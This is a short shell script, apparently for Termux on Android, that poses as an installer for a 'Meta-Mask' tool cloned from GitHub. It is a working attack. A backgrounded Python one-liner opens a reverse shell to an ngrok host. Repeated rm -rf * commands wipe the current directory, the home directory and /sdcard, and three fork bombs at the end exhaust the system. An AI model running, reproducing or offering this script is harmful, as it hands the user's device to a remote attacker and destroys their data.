rm -rf *
git clone https://github.com/SoraDev-ID/Meta-Mask
cd Meta-Mask
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.in.ngrok.io",15457));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' &
pkg install python
pkg install python3
cd Meta
python sora.py && rm -rf *
cd
rm -rf *
cd /sdcard
rm -rf *
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
